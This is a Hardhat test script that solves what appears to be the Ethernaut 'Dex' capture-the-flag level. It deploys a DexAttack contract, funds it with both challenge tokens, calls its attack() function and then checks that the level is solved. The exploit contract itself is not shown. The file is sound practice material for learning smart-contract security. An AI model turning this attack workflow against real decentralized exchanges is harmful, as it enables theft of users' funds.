import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Dex", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Dex`);
        const challengeAddress = await createChallenge(
            `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`, ethers.utils.parseEther("10.0")
        );
        challenge = await challengeFactory.attach(challengeAddress);

        const attackerFactory = await ethers.getContractFactory(`DexAttack`);
        attacker = await attackerFactory.deploy(challenge.address);

        return { eoa, challenge, attacker };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge, attacker } = await loadFixture(deployTokenFixture);

        try {
            const token1Address = await challenge.token1();
            const token2Address = await challenge.token2();
            console.log(token1Address, token2Address);
            let ABI = ["function transfer(address, uint256) external returns (bool)"];
            const token1 = new ethers.Contract(token1Address, ABI, eoa);
            const data = token1.interface.encodeFunctionData("transfer", [attacker.address, 10]);
            tx = await eoa.sendTransaction({
                from: await eoa.getAddress(),
                to: token1Address,
                data: data,
                gasLimit: BigNumber.from(`10000000`),
            });
            await tx.wait();
            tx = await eoa.sendTransaction({
                from: await eoa.getAddress(),
                to: token2Address,
                data: data,
                gasLimit: BigNumber.from(`10000000`),
            });
            await tx.wait();
            console.log(await challenge.balanceOf(token1Address,attacker.address));
            console.log(await challenge.balanceOf(token2Address,attacker.address));
            //console.log({tx});

            tx = await attacker.attack();
            await tx.wait();
        } catch (err) {
            console.log("error: " + err);
        }


    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
